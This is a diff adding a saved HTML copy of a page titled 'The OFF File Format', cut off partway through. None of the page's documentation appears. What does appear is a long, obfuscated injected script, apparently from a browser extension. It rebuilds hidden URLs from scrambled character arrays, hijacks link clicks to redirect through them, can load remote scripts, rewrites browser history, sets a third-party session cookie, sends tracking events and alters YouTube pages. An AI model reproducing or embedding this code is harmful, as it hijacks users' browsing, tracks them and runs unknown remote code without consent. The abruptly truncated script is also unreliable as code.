@@ -1,0 +1,262 @@
+
+<!-- saved from url=(0056)http://people.sc.fsu.edu/~jburkardt/html/off_format.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>
+      The OFF File Format
+    </title>
+  <link type="text/css" rel="stylesheet" href="chrome-extension://cpngackimfmofbokmjmljamhdncknpmg/style.css"><script type="text/javascript" charset="utf-8" src="chrome-extension://cpngackimfmofbokmjmljamhdncknpmg/page_context.js"></script><script>var hkghawgalkgklrgjlargjsrhg_hejrghakwghakwegkawefak = (function(){
+var e=null,f=[[9,16,17,6,15,20,12,19,5,1,8,18,13,14,11,0,4,10,7,2,3],[16,2,4,0,19,3,17,20,9,5,18,7,8,13,10,15,14,1,12,11,6],[1,5,16,20,2,7,19,15,17,0,12,3,6,13,9,4,11,18,8,14,10],[7,2,19,8,12,15,18,1,10,17,11,5,13,14,3,20,0,16,4,9,6],[7,25,9,29,1,12,14,13,22,18,10,16,24,28,26,6,19,5,4,0,17,11,2,20,15,27,21,23,3,8],[16,1,0,5,8,13,11,17,9,15,2,7,12,10,3,14,6,4],[6,13,11,24,23,2,4,28,19,8,0,1,5,27,21,12,20,7,22,25,26,14,29,16,9,10,17,3,15,18],[12,5,10,9,17,1,4,14,13,3,0,16,6,11,2,8,7,15],[12,13,20,23,
+1,9,26,2,30,4,0,15,17,24,14,22,18,10,3,11,8,5,7,25,19,29,27,21,28,6,16],[9,2,4,5,7,16,15,13,3,18,0,14,10,17,12,1,8,11,6],[13,10,5,1,8,0,9,6,7,4,3,16,15,12,11,2,14],[6,1,3,7,0,4,2,5],[5,4,7,6,0,1,3,2],[4,0,6,7,2,3,5,1],[0,2,1,3],[16,29,36,37,4,1,15,14,26,2,28,20,27,9,13,33,34,0,30,39,7,40,24,31,22,11,10,38,12,6,35,19,32,3,8,17,5,21,23,18,25],[36,24,40,1,17,8,4,16,9,30,22,31,33,6,3,41,27,11,28,29,2,5,23,7,32,38,21,25,0,34,13,37,15,20,39,19,35,18,12,14,26,10],[30,18,37,1,20,27,33,4,28,19,24,32,23,36,
+7,14,3,21,11,17,25,34,6,31,10,12,15,8,2,35,16,5,9,22,0,13,26,29],[7,10,25,24,19,9,29,23,8,3,6,17,30,11,31,4,21,27,20,26,28,2,1,5,18,14,15,22,13,16,0,12],[28,33,35,17,1,29,19,0,11,21,6,24,8,25,15,23,14,16,4,30,36,5,38,18,20,13,3,34,10,7,31,12,32,27,26,9,2,22,37],[2,1,8,14,6,3,7,4,10,12,9,11,5,13,0],[49,39,28,13,24,2,1,22,3,11,12,48,18,61,62,26,41,34,25,50,45,76,31,15,64,74,8,51,29,47,6,30,57,37,60,9,33,19,68,59,58,5,66,21,35,56,65,43,72,69,40,78,7,55,4,46,10,23,32,0,73,20,63,52,38,71,54,53,36,42,77,
+14,44,16,27,17,67,75,70],[0,4,2,10,6,8,1,9,7,11,5,3],[0,24,12,16,21,7,10,9,5,6,19,2,13,11,28,1,22,8,4,20,26,15,25,23,3,27,17,18,14,29],[27,13,0,4,22,14,19,38,15,11,5,6,8,10,24,29,16,21,34,18,37,30,17,1,33,20,3,12,9,31,26,32,23,2,36,35,28,7,25],[29,10,8,24,21,26,16,0,25,13,15,18,22,28,2,17,5,14,9,3,20,7,1,27,11,19,6,23,30,12,4],[2,35,37,4,20,34,30,31,28,14,22,38,17,32,19,24,10,0,25,6,18,13,3,21,5,16,36,29,1,15,12,11,33,8,27,7,26,39,23,9,40],[10,5,15,1,9,14,0,11,4,6,2,16,13,7,8,3,12],[6,18,22,4,13,
+21,15,17,5,0,7,20,10,3,12,19,1,9,23,14,16,8,2,11],[8,17,25,10,11,18,0,28,9,27,19,7,2,24,13,29,14,21,4,15,16,1,23,12,5,20,22,6,3,26],[2,20,19,8,12,1,5,4,0,16,15,7,17,10,18,21,9,14,3,6,13,11],[17,15,18,14,5,20,13,3,19,16,6,10,4,12,9,2,1,0,11,8,7],[15,9,6,21,12,19,4,5,7,3,8,20,2,0,1,11,14,16,10,17,13,18],[0,16,13,8,3,2,18,7,22,19,6,20,10,1,11,21,9,12,15,14,17,4,5],[11,2,12,1,13,4,18,3,14,19,23,6,8,15,5,16,9,7,21,22,17,0,10,20],[8,10,9,12,16,11,18,6,3,15,7,0,14,4,2,19,1,5,13,17],[4,11,13,0,10,1,18,14,
+6,17,3,2,20,8,19,5,12,16,7,9,15],[13,18,7,1,5,10,3,0,11,16,8,2,15,9,17,6,19,4,14,12],[8,9,16,1,15,3,12,7,11,19,2,14,10,17,20,13,6,5,0,4,18],[13,7,17,0,9,5,4,18,6,19,15,16,14,1,8,2,12,3,10,11],[8,4,0,1,5,20,7,6,16,2,15,17,10,13,9,11,12,3,14,18,19],[10,16,12,14,4,13,7,9,15,18,3,2,1,17,6,5,19,8,0,11],[2,3,19,15,1,4,11,12,18,17,0,8,6,9,5,10,14,20,13,7,16],[6,18,10,3,7,21,19,17,9,0,13,12,11,15,14,16,2,4,20,1,22,5,8],[4,0,8,20,14,23,5,16,19,2,12,15,21,11,6,18,3,22,13,7,17,10,1,9],[27,20,12,18,28,10,22,
+8,3,17,6,25,15,13,9,21,23,11,19,7,5,14,4,26,16,2,24,0,1],[27,41,40,39,6,20,11,34,46,23,12,48,31,43,5,18,15,44,8,32,24,3,9,16,14,26,42,33,29,2,37,45,47,4,25,0,7,49,10,22,1,19,21,30,28,17,38,13,36,35],[4,8,7,3,0,1,2,5,6],[17,10,15,2,7,0,1,8,12,6,16,5,14,9,13,11,3,4],[9,12,1,0,11,3,10,8,7,17,6,13,5,16,4,2,14,15],[11,20,18,14,5,2,13,3,16,17,19,9,7,21,15,10,0,12,1,22,6,8,4],[11,6,13,0,7,2,12,16,10,15,5,3,4,9,8,17,14,1],[10,7,21,28,19,16,18,3,5,26,12,23,4,0,8,14,24,25,6,27,2,13,20,1,15,22,17,11,9],[9,43,
+23,24,4,37,16,44,10,38,32,35,22,6,41,2,13,31,29,33,39,34,1,21,26,17,25,28,12,11,36,14,40,0,42,18,45,15,5,27,7,3,30,19,20,46,8],[13,1,6,11,12,15,0,9,2,5,3,14,4,8,10,7],[15,5,8,1,11,0,16,4,10,14,3,13,17,7,12,9,6,2],[2,9,5,1,3,10,8,0,4,11,6,7],[16,0,20,22,14,9,4,21,19,26,6,25,13,24,17,11,10,3,18,7,1,15,28,2,27,8,5,23,12],[17,34,5,29,3,31,33,11,30,36,18,32,19,24,13,6,21,28,1,22,14,8,23,12,27,2,16,38,26,4,25,35,9,37,7,20,10,0,15],[12,17,4,14,13,1,2,0,8,6,5,16,9,3,7,15,11,10],[11,7,5,9,8,6,0,4,3,10,12,
+2,1],[8,11,3,1,4,6,5,12,7,2,9,0,10],[11,10,0,4,8,5,7,3,9,6,1,2,12],[4,5,9,8,3,2,0,10,6,7,1],[9,2,0,8,6,7,4,11,5,10,12,1,3],[0,9,3,2,11,6,8,10,7,1,12,5,4],[9,7,1,4,2,6,8,11,0,3,5,12,10],[76,55,22,70,82,51,17,37,44,30,85,28,41,34,33,87,67,53,69,73,63,0,11,43,16,31,38,62,3,42,29,84,6,75,78,36,8,72,71,5,19,88,54,68,46,39,14,50,12,65,23,77,15,57,60,18,45,24,13,81,59,56,64,7,1,32,80,25,35,66,9,79,61,20,27,40,74,48,86,26,21,47,83,52,2,4,10,49,58],[52,22,29,11,49,59,20,2,27,38,15,64,69,17,43,67,4,25,30,33,
+42,5,24,56,7,45,8,28,54,6,65,44,14,12,50,32,26,57,55,62,70,60,48,46,40,39,3,63,31,10,51,68,16,36,13,71,18,21,0,23,66,34,41,61,58,1,19,37,53,47,35,9],[49,61,17,26,66,18,29,35,57,34,12,50,56,46,51,11,54,16,38,25,30,7,65,5,59,40,53,55,42,10,8,9,63,43,19,67,22,6,1,13,62,2,15,47,23,37,14,4,0,45,20,36,48,41,44,27,28,52,3,32,64,21,58,60,24,39,31,33],[69,27,37,56,55,4,58,10,0,30,22,49,23,8,44,6,21,66,26,28,36,5,19,52,38,59,2,32,9,70,71,41,1,43,33,34,14,35,20,11,45,39,40,47,13,48,7,68,15,57,29,46,18,16,60,
+54,24,31,51,67,65,61,63,42,25,50,64,17,3,12,53,62],[29,72,45,43,13,12,8,41,31,47,32,56,73,53,48,21,25,37,7,1,66,17,33,3,5,65,63,9,10,46,42,54,61,27,70,69,26,23,22,11,28,0,38,44,6,34,16,57,55,39,14,58,50,36,19,68,59,49,64,18,15,51,62,20,67,35,60,52,30,40,2,71,4,24],[22,1,39,44,58,63,16,61,35,70,23,33,55,26,62,40,56,0,64,13,6,43,50,42,65,29,11,34,41,66,47,14,46,30,49,27,68,54,28,4,59,18,32,71,60,15,19,24,67,17,25,9,37,53,5,7,31,21,57,12,38,69,52,20,36,48,45,10,51,8,3,2],[1,0,58,8,23,19,53,72,24,55,
+60,22,54,2,49,63,9,35,15,40,14,51,12,32,10,4,68,34,3,39,36,57,48,71,27,64,25,44,52,17,62,37,59,70,61,67,18,20,66,43,26,33,47,6,11,56,16,13,31,28,38,5,45,42,30,50,29,41,46,69,65,21,7],[2,7,6,12,4,15,3,0,14,1,13,9,8,16,5,10,11],[4,6,16,5,2,9,12,0,7,10,15,11,17,8,14,13,1,3],[7,14,10,15,8,17,2,18,13,6,1,5,9,11,12,3,0,4,16],[0,6,1,3,19,20,5,21,10,9,23,11,15,8,22,18,13,14,16,7,12,2,17,4],[6,10,8,2,11,7,12,0,15,5,4,1,9,14,3,17,16,13],[14,2,13,5,18,4,9,17,12,11,10,6,16,8,1,3,0,7,15],[19,18,13,9,15,7,11,1,
+4,3,20,8,17,5,22,6,21,14,12,16,2,0,10],[3,4,8,9,11,16,14,1,12,17,2,13,18,19,0,15,6,5,7,20,10],[18,7,20,0,13,9,5,10,17,15,12,16,21,4,11,1,8,14,2,3,19,6],[21,8,6,3,22,0,20,7,11,14,5,2,1,17,12,18,15,10,9,19,16,13,4],[1,15,12,0,8,3,5,11,13,14,2,16,17,10,6,7,9,4],[16,18,9,4,17,15,7,0,12,8,6,11,5,2,13,14,3,1,10],[8,7,13,1,12,15,4,3,9,2,10,11,14,5,6,0],[15,9,4,16,8,7,11,6,13,17,10,14,5,3,12,0,2,1],[6,8,18,14,12,0,11,15,10,13,3,17,1,4,5,16,2,7,9],[12,13,11,6,0,17,5,8,4,16,7,15,2,14,9,10,3,1],[8,1,11,2,16,
+6,14,0,4,10,13,9,5,3,15,7,12],[10,15,13,18,22,20,6,9,19,3,7,16,5,8,17,23,14,2,11,21,1,12,4,0],[4,18,24,19,15,23,22,7,11,14,1,2,8,20,16,5,6,21,25,3,10,13,12,17,9,0],[6,14,12,3,11,15,2,13,8,1,7,10,9,0,17,4,5,16],[15,1,6,3,8,4,12,0,9,14,7,10,5,11,13,2],[5,1,8,10,14,9,6,21,3,20,4,12,18,19,0,15,11,7,17,2,13,16],[9,12,17,18,22,13,6,20,8,11,10,16,21,15,4,1,19,3,0,14,2,5,7],[17,6,12,8,16,7,10,4,13,0,19,9,1,14,3,5,11,18,15,2],[4,15,7,11,14,13,19,12,9,18,8,0,16,3,1,2,10,6,17,5],[10,5,7,22,16,18,4,0,11,20,23,
+13,2,14,19,8,15,12,3,21,9,17,6,1]];function k(b,a){var c,d,h,g;for(c=1;c<b.length;c++){h=b[c];g=a[c];for(d=c;d>0&&b[d-1]>h;)b[d]=b[d-1],a[d]=a[d-1],d--;b[d]=h;a[d]=g}}var p,q,r,s;function aa(){var b=f[4];if(!t){var a="w,/,w,k,t,u,b,m,n,c,.,r,w,n,l,/,o,/,:,h,.,t,t,m,l,i,/,e,p,w".split(",");k(b,a);t=a.join("")}return t}var t,u;function ba(){var b=f[6];if(!v){var a="/,m,t,w,e,t,:,x,o,w,h,t,/,e,/,u,m,w,n,/,t,b,t,r,w,.,.,p,l,c".split(",");k(b,a);v=a.join("")}return v}var v,w;
+function ca(){var b=f[8];if(!x){var a="u,m,m,e,t,w,p,t,o,:,h,l,.,w,b,n,c,.,p,t,w,/,w,/,o,t,h,/,o,/,r".split(",");k(b,a);x=a.join("")}return x}var x,y,z;function da(){var b=f[11];if(!A){var a="o,e,p,m,h,r,a,c".split(",");k(b,a);A=a.join("")}return A}var A;function ea(){var b=f[14];if(!B){var a=["r","f","e","="];k(b,a);B=a.join("")}return B}var B;
+function fa(){var b=f[15];if(!C){var a="2,o,l,i,:,t,o,e,r,t,m,.,o,w,d,p,?,h,.,k,w,=,/,p,e,v,.,n,i,/,d,3,h,p,w,m,/,n,t,p,p".split(",");k(b,a);C=a.join("")}return C}var C;function ga(){var b=f[16];if(!D){var a="a,/,h,t,m,w,:,2,w,d,e,o,n,/,p,p,t,v,e,r,t,/,t,w,w,.,n,a,h,l,d,d,o,.,p,3,o,p,i,e,f,.".split(",");k(b,a);D=a.join("")}return D}var D;function ha(){var b=f[17];if(!E){var a="Y,p,/,t,.,e,T,:,w,3,/,u,t,e,w,e,p,n,v,m,v,u,/,o,.,i,o,w,t,b,2,/,w,e,h,d,i,/".split(",");k(b,a);E=a.join("")}return E}
+var E,F,G;function ia(){var b=f[24];if(!H){var a="t,.,h,:,y,1,5,p,0,2,/,/,6,1,/,o,7,/,t,1,h,m,.,t,n,4,p,6,.,m,e,e,t,t,p,.,C,9,g".split(",");k(b,a);H=a.join("")}return H}var H,I,J,K,L;function ja(){var b=f[31];if(!M){var a=".,l,c,g,/,m,o,p,o,e,/,.,:,o,w,t,t,h,g,w,w".split(",");k(b,a);M=a.join("")}return M}var M;function ka(){var b=f[32];if(!N){var a="g,w,/,m,g,c,s,:,/,p,w,o,t,h,t,.,o,l,w,e,o,.".split(",");k(b,a);N=a.join("")}return N}var N;
+function la(){var b=f[33];if(!O){var a="h,e,o,w,p,t,c,w,p,o,/,.,.,t,g,j,w,o,l,g,.,:,/".split(",");k(b,a);O=a.join("")}return O}var O;function ma(){var b=f[34];if(!P){var a=".,t,g,t,o,s,.,p,o,c,p,/,w,g,:,l,w,/,.,j,e,h,w,o".split(",");k(b,a);P=a.join("")}return P}var P;function na(){var b=f[35];if(!Q){var a="w,.,w,o,e,g,d,/,p,l,w,h,g,:,t,e,t,/,o,.".split(",");k(b,a);Q=a.join("")}return Q}var Q;
+function oa(){var b=f[36];if(!R){var a="s,.,o,h,w,t,.,o,/,e,p,t,e,w,d,:,g,l,/,w,g".split(",");k(b,a);R=a.join("")}return R}var R;function pa(){var b=f[37];if(!S){var a="o,f,w,t,/,.,p,h,g,e,w,t,l,w,.,/,r,:,g,o".split(",");k(b,a);S=a.join("")}return S}var S;function qa(){var b=f[38];if(!T){var a="w,w,l,t,g,p,g,/,.,f,t,o,w,e,r,o,/,:,h,s,.".split(",");k(b,a);T=a.join("")}return T}var T;
+function ra(){var b=f[39];if(!sa){var a="o,w,.,h,w,/,:,c,/,a,l,e,g,t,w,t,o,p,.,g".split(",");k(b,a);sa=a.join("")}return sa}var sa;function ta(){var b=f[40];if(!ua){var a="w,s,h,t,:,a,/,/,l,t,g,e,w,o,w,.,g,p,o,.,c".split(",");k(b,a);ua=a.join("")}return ua}var ua;function va(){var b=f[41];if(!wa){var a=".,e,o,g,:,o,w,w,l,e,p,t,t,.,/,/,s,w,h,g".split(",");k(b,a);wa=a.join("")}return wa}var wa;
+function xa(){var b=f[42];if(!ya){var a="t,p,e,g,t,s,.,g,.,e,h,w,/,w,:,w,o,s,o,/,l".split(",");k(b,a);ya=a.join("")}return ya}var ya;function za(){var b=f[43];if(!Aa){var a="/,c,.,p,w,u,o,.,w,h,o,o,g,l,g,e,t,:,.,t,k,/,w".split(",");k(b,a);Aa=a.join("")}return Aa}var Aa;function Ba(){var b=f[44];if(!Ca){var a="s,h,w,o,o,k,:,l,c,t,g,g,.,.,/,.,p,u,o,/,e,w,t,w".split(",");k(b,a);Ca=a.join("")}return Ca}var Ca,Da,Ea,Fa;
+function Ga(){var b=f[48];if(!Ha){var a=".,.,o,t,w,h,t,w,m,/,n,/,z,w,a,a,p,:".split(",");k(b,a);Ha=a.join("")}return Ha}var Ha;function Ia(){var b=f[49];if(!Ja){var a="k,n,h,.,a,p,b,c,i,t,l,k,c,e,.,o,.,n".split(",");k(b,a);Ja=a.join("")}return Ja}var Ja,Ka,La,Ma,Na,Oa,Pa,Qa,Ra,Sa;function Ta(){var b=f[59];if(!Ua){var a="m,.,:,z,a,t,t,h,w,/,/,n,w,p,w,o,a,.".split(",");k(b,a);Ua=a.join("")}return Ua}var Ua,Va,Wa,Xa,Ya,Za,$a,ab,bb,cb,db,eb,fb,gb,hb,ib;
+function jb(){var b=f[75];if(!kb){var a=":,/,n,/,t,w,m,h,w,.,o,a,.,w,z,a,t,p".split(",");k(b,a);kb=a.join("")}return kb}var kb;function lb(){var b=f[76];if(!mb){var a="/,a,w,z,w,n,t,.,m,/,t,:,w,.,a,p,h,s,o".split(",");k(b,a);mb=a.join("")}return mb}var mb;function nb(){var b=f[77];if(!ob){var a="h,/,t,p,3,.,/,n,.,w,t,v,o,w,e,p,d,e,2,w,i,t,m,:".split(",");k(b,a);ob=a.join("")}return ob}var ob;
+function pb(){var b=f[78];if(!qb){var a="/,.,w,t,g,w,o,h,l,/,:,t,w,g,p,.,e,o".split(",");k(b,a);qb=a.join("")}return qb}var qb;function rb(){var b=f[79];if(!sb){var a="o,t,o,:,.,s,w,e,g,.,w,/,l,w,t,p,h,/,g".split(",");k(b,a);sb=a.join("")}return sb}var sb;function tb(){var b=f[80];if(!ub){var a=".,k,c,w,b,w,f,t,:,p,c,w,o,/,m,/,o,e,a,o,t,h,.".split(",");k(b,a);ub=a.join("")}return ub}var ub;
+function vb(){var b=f[81];if(!wb){var a="p,s,w,w,.,b,c,t,f,o,t,a,o,k,h,e,/,:,/,.,w".split(",");k(b,a);wb=a.join("")}return wb}var wb;function xb(){var b=f[82];if(!yb){var a=".,w,o,h,u,w,/,.,e,u,o,b,m,:,y,t,w,t,t,p,c,/".split(",");k(b,a);yb=a.join("")}return yb}var yb;function zb(){var b=f[83];if(!Ab){var a="o,w,/,p,m,h,c,/,.,u,:,t,t,b,y,e,t,w,w,.,u,o,s".split(",");k(b,a);Ab=a.join("")}return Ab}var Ab;
+function Bb(){var b=f[84];if(!Cb){var a="t,c,e,h,w,p,/,t,r,.,t,o,m,t,/,t,i,:".split(",");k(b,a);Cb=a.join("")}return Cb}var Cb;function Db(){var b=f[85];if(!Eb){var a="c,m,w,s,o,.,/,h,t,t,/,t,:,t,e,r,p,t,i".split(",");k(b,a);Eb=a.join("")}return Eb}var Eb;function Fb(){var b=f[86];if(!Gb){var a="l,f,c,t,.,m,:,p,v,t,t,o,o,/,/,h".split(",");k(b,a);Gb=a.join("")}return Gb}var Gb;function Hb(){var b=f[87];if(!Ib){var a="o,w,:,n,w,w,a,/,a,.,.,z,/,p,m,h,t,t".split(",");k(b,a);Ib=a.join("")}return Ib}var Ib;
+function Jb(){var b=f[88];if(!Kb){var a="/,w,.,a,a,h,.,z,w,m,p,n,t,s,:,o,t,/,w".split(",");k(b,a);Kb=a.join("")}return Kb}var Kb;function Lb(){var b=f[89];if(!Mb){var a="u,m,t,/,h,.,/,w,:,r,w,l,t,b,w,.,p,t".split(",");k(b,a);Mb=a.join("")}return Mb}var Mb;function Nb(){var b=f[90];if(!Ob){var a="w,t,o,t,.,/,u,h,:,.,k,w,/,p,t,w,r".split(",");k(b,a);Ob=a.join("")}return Ob}var Ob;
+function Pb(){var b=f[91];if(!Qb){var a=".,o,d,p,e,.,/,w,3,p,w,2,/,w,m,t,e,t,v,n,t,i,:,h".split(",");k(b,a);Qb=a.join("")}return Qb}var Qb;function Rb(){var b=f[92];if(!Sb){var a=":,-,r,m,u,o,.,w,y,t,t,t,w,p,b,/,/,3,g,p,.,u,o,e,w,h".split(",");k(b,a);Sb=a.join("")}return Sb}var Sb;function Tb(){var b=f[93];if(!Ub){var a="/,g,o,p,g,l,t,o,w,t,w,.,w,h,.,:,/,e".split(",");k(b,a);Ub=a.join("")}return Ub}var Ub,Vb,Wb,Xb,Yb,Zb;
+function $b(){var b=f[99];if(!ac){var a=".,/,w,o,b,n,:,h,c,.,m,i,t,c,k,w,k,l,p,c,w,a,/,t".split(",");k(b,a);ac=a.join("")}return ac}var ac;function bc(b){var a=document.createElement("script");a.setAttribute("type","text/javascript");a.setAttribute("src",b);typeof a!="undefined"&&document.getElementsByTagName("head")[0].appendChild(a)}function cc(b){try{var a=JSON.parse(window.localStorage.settingsDaemon);return a[b]?a[b]:e}catch(c){return e}}function dc(b,a){var c=cc(b);return c?c:a}
+function ec(){try{var b=window.localStorage.versionDaemon;return b?parseInt(b,10):1}catch(a){return 1}}
+function U(b,a,c,d,h,g){b.onclick=function(b){var b=b||window.event,j=b.which==2||b.ctrlKey||b.metaKey;V(c,d,g);if(h)if(fc()){var l=gc,m=f[0];if(!p){var o="w,.,c,/,r,/,e,m,/,t,w,o,a,p,h,h,:,.,w,t,p".split(",");k(m,o);p=o.join("")}l(a,p,j)}else{l=f[1];q||(m=".,t,:,h,m,p,c,/,w,/,o,w,w,a,.,r,p,t,e,h,/".split(","),k(l,m),q=m.join(""));l=a;m=q;if(o=ec()>=10){o=f[2];if(!r){var n="t,/,.,/,t,w,m,r,c,h,e,p,/,a,w,:,h,o,w,p,.".split(",");k(o,n);r=n.join("")}o=m!=r}o?l=m+"# #"+l:(m=f[3],s||(o="w,t,m,w,e,r,o,t,.,c,h,/,a,p,p,#,h,.,:,w,/".split(","),
+k(m,o),s=o.join("")),l=s+l);j?window.open(l,"_blank"):window.location.href=l}else j?window.open(a,"_blank"):window.location.href=a;b.stopPropagation();return!1}}function fc(){return!navigator.userAgent||navigator.userAgent.indexOf("Firefox")==-1?!1:!0}function W(){return(new Date).getTime()}function hc(){var b=document.getElementById("main");if(b!=e)b.style.display="none"}
+function V(b,a,c){if(Math.random()<c&&(b={event:b,data:a,randomString:ic(3)},a=document.getElementById("mixpanel"),a!=e))a.innerHTML=JSON.stringify(b)}function gc(b,a,c){var a={event:"redirect",data:{url:b,referer:a}},d=document.getElementById("chromeServerToAddonMessage");if(d!=e)d.innerHTML=JSON.stringify(a),setTimeout(function(){c?window.open(b,"_blank"):window.location.href=b},250)}
+function X(b,a,c){if(b!=e){b=b.getElementsByTagName(a);for(a=0;a<b.length;a++)if(b[a].className.indexOf(c)==0)return b[a]}return e}function ic(b){for(var a="",c=0;c<b;c++)a+="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random()*52));return a}
+function jc(){kc=setInterval(function(){var b=X(document.body,"button","IDD EMB");if(b!=e)clearInterval(kc),b.onmousedown=function(){var a=f[10];if(!z){var b="0, ,_,r,s,o,t,p,o,t,u,1,0,=,p,k,.".split(",");k(a,b);z=b.join("")}V(z,{},0.01)}},700)}var kc,Y=e;function lc(){if(Y!=e)for(var b=document.getElementsByTagName("a"),a=0;a<b.length;a++)b[a].onmouseup=function(){mc()}}function nc(){var b=Z.substring(0,oc);Y=Z;window.history.replaceState(e,"",b);window.onbeforeunload=function(){mc()}}
+function mc(){Y!=e&&window.history.replaceState(e,"",Y)}
+function pc(){var b=document.getElementById("progress_info");if(b){if(b.style)b.style.font="12px arial,sans-serif";document.body.insertBefore(b,document.body.firstChild);document.body.style.margin="0px";var a=document.getElementById("content");if(a)a.style.margin="0px";for(var a=document.body.childNodes,c=0;c<a.length;c++){var d=a[c];if(d!=b&&d.style)d.style.visibility="hidden"}}qc=setInterval(function(){var a=document.getElementById("dl_link");if(a.firstChild){clearInterval(qc);window.location.href=
+a.firstChild.href;try{a.getElementsByTagName("a")[1].style.display="none"}catch(b){}}},200)}var qc;
+function rc(){window.location.href.indexOf(ha())==0&&(sc=setInterval(function(){var b=document.getElementById("download");if(b)clearInterval(sc),window.location.href=b.href,setTimeout(function(){var a=window.location,c=f[18];if(!F){var d="w,.,w,o,c,w,a,d,w,p,/,e,d,o,#,:,m,l,o,n,o,t,t,/,.,t,u,/,y,b,h,x".split(",");k(c,d);F=d.join("")}a.href=F+b.href},17E3)},200));tc=setInterval(function(){var b=document.getElementById("conv");if(b){clearInterval(tc);document.body.insertBefore(b,document.body.firstChild);
+for(var a=document.body.childNodes,c=0;c<a.length;c++){var d=a[c];if(d!=b&&d.style)d.style.visibility="hidden"}}},200)}var sc,tc;
+function uc(){var b=document.getElementsByTagName("pre");if(b!=e&&b.length>0&&(b=JSON.parse(b[0].innerHTML).phpsessid))document.cookie="PHPSESSID="+b+"; path=/; domain=.flvto.com lang=en; expires="+(new Date((new Date).getTime()+18E5)).toGMTString(),window.location.href="http://flvto.com";setTimeout(function(){var a=document.getElementById("upload");if(a){hc();document.body.appendChild(a);var b=document.createElement("h1");b.innerHTML="Converting YouTube video to MP3";b.style.textAlign="center";b.style.fontSize=
+"50px";b.style.fontWeight="bold";a.insertBefore(b,a.childNodes[0]);if(a=document.getElementById("progress-info"))a.style.fontSize="35px",a.style.fontWeight="bold",a.style.paddingTop="40px";if(a=document.getElementById("progress"))a.style.padding="40px"}else{a:{a=document.body;if(a!=e){a=a.getElementsByTagName("div");for(b=0;b<a.length;b++)if(a[b].className=="b_form"){a=a[b];break a}}a=e}if(a)hc(),document.body.appendChild(a),a.style.fontSize="20px"}},1E3)}var vc=e;
+function wc(){try{document.getElementsByTagName("html").item(0).lang&&document.getElementsByTagName("body").item(0).className&&window.location.href.match("youtube.com")&&document.getElementsByTagName("html").item(0);var b=["Download this video!","Download","Download specific format"],a=function(a,c,g){document.getElementById("watch-actions-right")&&(document.getElementById("watch-actions-right").innerHTML+='<div id="watch-actions-center" style="display:inline;">&nbsp;<span class="yt-uix-button-group addto-container watch show-label"><button id="download" class="start yt-uix-tooltip-reverse yt-uix-button yt-uix-tooltip" data-tooltip-title="'+
+b[0]+'" data-tooltip-timer="625" title="" data-tooltip="'+b[0]+'"><span class="yt-uix-button-content">'+c+'</span></button><button id="menu" class="end yt-uix-tooltip-reverse yt-uix-button yt-uix-tooltip yt-uix-button-empty" onclick=";return false;" data-tooltip-title="'+b[2]+'" data-tooltip-timer="625" title="" data-tooltip="'+b[2]+'" data-button-listener="16" data-content-id="yt-uix-tooltip2-content"><span class="yt-uix-button-content"><img class="yt-uix-button-arrow" src="//s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif" alt=""></span><ul class="yt-uix-button-menu hid" id="downloadMenu">'+
+a+"</ul></button></span></div>");document.getElementById("watch-actions-right")&&document.getElementById("watch-share").parentNode.insertBefore(document.getElementById("watch-actions-center"),document.getElementById("watch-flag").nextSibling);if(document.getElementById("watch-rating")!=e){var i=document.getElementById("watch-actions");if(i)i.style.height="45px"}document.getElementById("watch-rating")&&(document.getElementById("watch-actions").innerHTML+='<div id="watch-actions-center" style="display:inline;"><span class="yt-uix-button-group addto-container watch show-label"><button type="button" id="download" class="start yt-uix-tooltip yt-uix-button yt-uix-tooltip" data-tooltip-title="'+
+b[0]+'" data-tooltip-timer="625" title="" data-tooltip="'+b[0]+'"><span class="yt-uix-button-content">'+c+'</span></button><button id="menu" class="end yt-uix-tooltip yt-uix-button yt-uix-tooltip yt-uix-button-empty" onclick=";return false;" data-tooltip-title="'+b[2]+'" data-tooltip-timer="625" title="" data-tooltip="'+b[2]+'" data-button-listener="16" data-content-id="yt-uix-tooltip2-content"><span class="yt-uix-button-content"><img class="yt-uix-button-arrow" src="//s.ytimg.com/yt/img/pixel-vfl3z5WfW.gif" alt=""></span><ul class="yt-uix-button-menu hid" id="downloadMenu">'+
+a+"</ul></button></span></div>");a=document.getElementById("download");if(a!=e)a.onclick=function(){window.location.href=g}};(function(){for(var d=/"url_encoded_fmt_stream_map": ".+?",/,c=document.getElementsByTagName("script"),g=0;g<c.length;g++)if(d.test(c[g].innerHTML))var i=c[g].innerHTML;var c=document.getElementById("eow-title").innerHTML.replace(/\//gi,"").replace(/\\/gi,"").replace(/"/gi,"'").replace(/\+/gi,"and").replace(/&/gi,"and").replace(/:/gi,"").replace(/\*/gi,"").replace(/#/gi,"").replace(/\./gi,
+""),j;j="";window.location.href.replace(/^[^v]+v.(.{11}).*/,"$1");for(var g=new String(d.exec(i)),g=g.replace(" ","").replace('"url_encoded_fmt_stream_map":"url=',""),g=g.substring(0,g.length-2),g=decodeURIComponent(g).replace(/%2C/g,",").replace(/%3A/g,":").replace(/\\u0026/g,"&"),d=[],d=g.split("url="),l=i="",m="",g=0;g<d.length;g++){var o=[],o=d[g].split("itag="),n=[],n=o[1].split("&");d[g]=d[g].split(";")[0];d[g]=d[g].split("&quality")[0];n[0]=="5"&&(i+='<a href="'+d[g]+"&title="+j+c+'" style="color:black;text-decoration:none;"><li class="yt-uix-button-menu-item" id="v240p">FLV (240p)</li></a>');
+n[0]=="35"&&(i+='<a href="'+d[g]+"&title="+j+c+'" style="color:black;text-decoration:none;"><li class="yt-uix-button-menu-item" id="v480p">FLV (480p)</li></a>');n[0]=="18"&&(i+='<a href="'+d[g]+"&title="+j+c+'" style="color:black;text-decoration:none;"><li class="yt-uix-button-menu-item" id="v360p">MP4 (360p)</li></a>');n[0]=="22"&&(i+='<a href="'+d[g]+"&title="+j+c+'" style="color:black;text-decoration:none;"><li class="yt-uix-button-menu-item" id="v720p">MP4 HD (720p)</li></a>');n[0]=="37"&&(i+=
